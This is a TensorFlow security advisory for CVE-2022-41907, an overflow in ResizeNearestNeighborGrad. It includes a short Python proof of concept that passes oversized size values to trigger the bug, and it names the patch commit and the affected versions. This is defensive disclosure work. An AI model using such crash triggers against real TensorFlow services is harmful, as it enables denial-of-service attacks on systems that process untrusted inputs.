<h2>TFSA-2022-149: Overflow in <code>ResizeNearestNeighborGrad</code></h2>
<h3>CVE Number</h3>
<p>CVE-2022-41907</p>
<h3>Impact</h3>
<p>When <a href="https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/image/resize_nearest_neighbor_op.cc"><code>tf.raw_ops.ResizeNearestNeighborGrad</code></a> is given a large <code>size</code> input, it overflows.
```
import tensorflow as tf</p>
<p>align_corners = True
half_pixel_centers = False
grads = tf.constant(1, shape=[1,8,16,3], dtype=tf.float16)
size = tf.constant([1879048192,1879048192], shape=[2], dtype=tf.int32)
tf.raw_ops.ResizeNearestNeighborGrad(grads=grads, size=size, align_corners=align_corners, half_pixel_centers=half_pixel_centers)
```</p>
<h3>Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/00c821af032ba9e5f5fa3fe14690c8d28a657624">00c821af032ba9e5f5fa3fe14690c8d28a657624</a>.</p>
<p>The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.</p>
